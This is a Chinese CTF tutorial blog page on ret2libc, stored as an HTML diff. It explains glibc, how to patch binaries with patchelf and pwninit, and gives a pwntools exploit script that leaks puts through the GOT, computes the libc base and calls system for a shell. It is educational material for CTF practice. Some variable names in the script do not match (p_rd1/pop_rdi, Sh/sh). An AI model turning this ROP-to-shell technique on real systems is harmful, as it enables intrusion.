@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="ret2libc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2libc">
+<meta property="og:url" content="http://example.com/2026/03/13/ret2libc/index.html">
+<meta property="og:site_name" content="Hanson&#39;s blog">
+<meta property="og:description" content="ret2libc">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-13T09:24:49.000Z">
+<meta property="article:modified_time" content="2026-10-30T11:29:21.996Z">
+<meta property="article:author" content="Hanson">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2026/03/13/ret2libc/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/03/13/ret2libc/","path":"2026/03/13/ret2libc/","title":"ret2libc"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ret2libc | Hanson's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","cdn":"https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hanson's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-number">1.</span> <span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFglibc"><span class="nav-number">1.1.</span> <span class="nav-text">什么是glibc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#patch%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.2.</span> <span class="nav-text">patch介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-patch%EF%BC%88%E8%A1%A5%E4%B8%81%EF%BC%89"><span class="nav-number">1.2.1.</span> <span class="nav-text">什么是 patch（补丁）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81-patch"><span class="nav-number">1.2.2.</span> <span class="nav-text">为什么要 patch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84-patch-%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.3.</span> <span class="nav-text">最常见的 patch 类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%B8%8F%E2%83%A3-patch-libc-%E8%B7%AF%E5%BE%84%EF%BC%88%E6%9C%80%E5%B8%B8%E8%A7%81%EF%BC%89"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">1️⃣ patch libc 路径（最常见）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%B8%8F%E2%83%A3-patch-%E6%8C%87%E4%BB%A4"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">2️⃣ patch 指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%EF%B8%8F%E2%83%A3-patch-GOT"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">3️⃣ patch GOT</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%8E%E4%B9%88-patch%EF%BC%88%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="nav-number">1.2.4.</span> <span class="nav-text">怎么 patch（常见工具）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9Apatchelf%EF%BC%88%E6%9C%80%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">方法1：patchelf（最常用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9Apwninit%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">方法2：pwninit（推荐）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9AIDA-patch"><span class="nav-number">1.2.4.3.</span> <span class="nav-text">方法3：IDA patch</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#patch"><span class="nav-number">1.2.6.</span> <span class="nav-text">patch</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%8F%E5%85%B8%E8%84%9A%E6%9C%AC"><span class="nav-number">1.3.</span> <span class="nav-text">经典脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#moectf-%E8%AE%A4%E8%AF%86libc"><span class="nav-number">1.4.1.</span> <span class="nav-text">moectf 认识libc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PIE"><span class="nav-number">1.5.</span> <span class="nav-text">PIE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE-%E5%9C%A8-PWN-%E4%B8%AD%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="nav-number">1.5.1.</span> <span class="nav-text">PIE 在 PWN 中怎么绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="nav-number">1.5.2.</span> <span class="nav-text">例题</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Hanson"
+      src="/images/dog.png">
+  <p class="site-author-name" itemprop="name">Hanson</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Hanson0512" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hanson0512" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2394056860@qq.com" title="E-Mail → mailto:2394056860@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/13/ret2libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/dog.png">
+      <meta itemprop="name" content="Hanson">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hanson's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ret2libc | Hanson's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2libc
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-03-13 17:24:49" itemprop="dateCreated datePublished" datetime="2026-03-13T17:24:49+08:00">2026-03-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-30 19:29:21" itemprop="dateModified" datetime="2026-10-30T19:29:21+08:00">2026-10-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><span id="more"></span>
+<h2 id="什么是glibc"><a href="#什么是glibc" class="headerlink" title="什么是glibc"></a>什么是glibc</h2><!--more-->
+<p>glibc是GNUC库的缩写。它是Linux操作系统和其他类 Unix系统(如GNU/Hurd)上最核心、最重要的系统库之一。<br>简单来说，你可以把 glibc 想象成应用程序和Linux 内核之间的”翻译官”和“工具箱”<br>以下是关于 glibc 的关键点:<br>核心功能:<br>实现C标准库:它提供了ISOC标准(如C11,C17)规定必须有的所有函数，例如:<br>输入/输出 (printf, scanf, fopen, fclose)<br>字符串操作(strcpy, strlen,strcmp)<br>内存管理(malloc,free, calloc)<br>数学函数(sin,cos, sqrt)</p>
+<p>这两个问题其实都非常典型，在做 <strong>ret2libc / pwn 题</strong> 时几乎都会遇到。我按顺序帮你彻底讲清楚。</p>
+<hr>
+<h2 id="patch介绍"><a href="#patch介绍" class="headerlink" title="patch介绍"></a>patch介绍</h2><!--more-->
+<h3 id="什么是-patch（补丁）"><a href="#什么是-patch（补丁）" class="headerlink" title="什么是 patch（补丁）"></a>什么是 patch（补丁）</h3><!--more-->
+<p>在 CTF 里说 <strong>“patch 二进制”</strong>，意思是：</p>
+<blockquote>
+<p><strong>修改程序的机器码或 ELF 结构，使程序行为发生变化。</strong></p>
+</blockquote>
+<p>简单说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patch = 修改二进制程序</span><br></pre></td></tr></table></figure>
+<p>比如：</p>
+<ul>
+<li>修改函数地址</li>
+<li>修改 libc 路径</li>
+<li>修改指令</li>
+<li>修改保护</li>
+</ul>
+<hr>
+<h3 id="为什么要-patch"><a href="#为什么要-patch" class="headerlink" title="为什么要 patch"></a>为什么要 patch</h3><!--more-->
+<p>在 pwn 题中 patch 最常见的原因是 <strong>统一运行环境</strong>。</p>
+<p>因为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序运行依赖 libc</span><br></pre></td></tr></table></figure>
+<p>而不同系统的 libc 不一样。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">远程环境</span><br><span class="line">libc = libc-2.27.so</span><br><span class="line"></span><br><span class="line">你本地</span><br><span class="line">libc = libc-2.35.so</span><br></pre></td></tr></table></figure>
+<p>那 这些函数在libc中的offsets 就不同：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts offset</span><br><span class="line">system offset</span><br></pre></td></tr></table></figure>
+<hr>
+<p>所以题目一般会给：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chall</span><br><span class="line">libc.so.6</span><br><span class="line">ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure>
+<p>但你的系统默认用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>
+<p>因此需要 <strong>patch 程序让它使用题目给的 libc</strong>。</p>
+<hr>
+<h3 id="最常见的-patch-类型"><a href="#最常见的-patch-类型" class="headerlink" title="最常见的 patch 类型"></a>最常见的 patch 类型</h3><!--more-->
+<h4 id="1️⃣-patch-libc-路径（最常见）"><a href="#1️⃣-patch-libc-路径（最常见）" class="headerlink" title="1️⃣ patch libc 路径（最常见）"></a>1️⃣ patch libc 路径（最常见）</h4><!--more-->
+<p>查看程序依赖：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd chall</span><br></pre></td></tr></table></figure>
+<p>可能看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>
+<p>但题目给的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./libc.so.6</span><br></pre></td></tr></table></figure>
+<p>所以要 patch：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让程序加载题目提供的 libc</span><br></pre></td></tr></table></figure>
+<p>常用工具：</p>
+<p>patchelf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 chall</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 chall</span><br></pre></td></tr></table></figure>
+<p>这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chall</span><br><span class="line"> └─ 使用题目给的 libc</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="2️⃣-patch-指令"><a href="#2️⃣-patch-指令" class="headerlink" title="2️⃣ patch 指令"></a>2️⃣ patch 指令</h4><!--more-->
+<p>例如：</p>
+<p>程序有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit(0)</span><br></pre></td></tr></table></figure>
+<p>你想让它继续执行。</p>
+<p>可以 patch：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call exit</span><br><span class="line">→ nop nop nop</span><br></pre></td></tr></table></figure>
+<p>工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IDA</span><br><span class="line">Ghidra</span><br><span class="line">Binary Ninja</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="3️⃣-patch-GOT"><a href="#3️⃣-patch-GOT" class="headerlink" title="3️⃣ patch GOT"></a>3️⃣ patch GOT</h4><!--more-->
+<p>有时为了调试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf@got</span><br><span class="line">→ system</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="怎么-patch（常见工具）"><a href="#怎么-patch（常见工具）" class="headerlink" title="怎么 patch（常见工具）"></a>怎么 patch（常见工具）</h3><!--more-->
+<h4 id="方法1：patchelf（最常用）"><a href="#方法1：patchelf（最常用）" class="headerlink" title="方法1：patchelf（最常用）"></a>方法1：patchelf（最常用）</h4><!--more-->
+<p>修改动态链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld.so chall</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 chall</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="方法2：pwninit（推荐）"><a href="#方法2：pwninit（推荐）" class="headerlink" title="方法2：pwninit（推荐）"></a>方法2：pwninit（推荐）</h4><!--more-->
+<p>现在很多人直接用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwninit</span><br></pre></td></tr></table></figure>
+<p>自动 patch：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwninit</span><br></pre></td></tr></table></figure>
+<p>自动生成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall_patched</span><br></pre></td></tr></table></figure>
+<p>并写好：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solve.py</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="方法3：IDA-patch"><a href="#方法3：IDA-patch" class="headerlink" title="方法3：IDA patch"></a>方法3：IDA patch</h4><!--more-->
+<p>直接改机器码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Edit → Patch program</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><!--more-->
+<h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><!--more-->
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改二进制程序</span><br></pre></td></tr></table></figure>
+<p>最常见原因：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">统一 libc 环境</span><br></pre></td></tr></table></figure>
+<p>最常见工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf</span><br><span class="line">pwninit</span><br><span class="line">IDA</span><br></pre></td></tr></table></figure>
+<h2 id="经典脚本"><a href="#经典脚本" class="headerlink" title="经典脚本"></a>经典脚本</h2><!--more-->
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&quot;./stack_overflow_64_ret2libc.elf&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_offset=libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">dothings=<span class="number">0x40119e</span></span><br><span class="line">p_rd1=<span class="number">0x000000000040116a</span></span><br><span class="line">Sh=<span class="number">0x0402008</span>-<span class="number">3</span></span><br><span class="line">ret=<span class="number">0x0000000000401016</span></span><br><span class="line">puts_plt=elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">padding=<span class="string">b&quot;\x00&quot;</span>*<span class="number">32</span></span><br><span class="line">payload=padding+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(dothings)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your input is:\n&quot;</span>)</span><br><span class="line">recv=p.recv(<span class="number">6</span>)</span><br><span class="line">puts_libc=u64(recv.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_libc-&gt;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(puts_libc)))</span><br><span class="line">libc_base=puts_libc-puts_offset</span><br><span class="line">log.success(<span class="string">&quot;libc_base-&gt;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload=padding+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(sh)+p64(ret)+p64(system)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>脚本的意思是通过got表打印出puts函数的真实地址，然后利用libc文件中puts函数的偏移，计算libc在程序中的基地址</p>
+<p>进而利用system函数的偏移，执行system函数</p>
+<p>对疑惑点进行解读：</p>
+<p>pwntools 的 <code>libc.symbols[&#39;puts&#39;]</code></p>
+<p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_offset = libc.symbols[&#x27;puts&#x27;]</span><br></pre></td></tr></table></figure>
+<p><strong>pwntools读取的是 ELF 文件本身</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.so.6</span><br></pre></td></tr></table></figure>
+<p>而这个文件里只有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数在文件中的位置</span><br></pre></td></tr></table></figure>
+<p>所以得到的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_offset = 0x0809c0</span><br></pre></td></tr></table></figure>
+<p>而不是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7a649c0</span><br></pre></td></tr></table></figure>
+<p>因为在本身程序加载的时候，linux会开启alsr保护，因此会将libc放在内存的一个随机位置：</p>
+<blockquote>
+<p>pwntools 不知道 libc 会被加载到哪。</p>
+</blockquote>
+<p>因此直接读取libc文件中函数存放的地址（即偏移）再进行简单的计算即可</p>
+<p>此外，有的题目会直接print一些libc中函数的地址：注意区分函数表达：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>名字</th>
+<th>含义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>printf@plt</td>
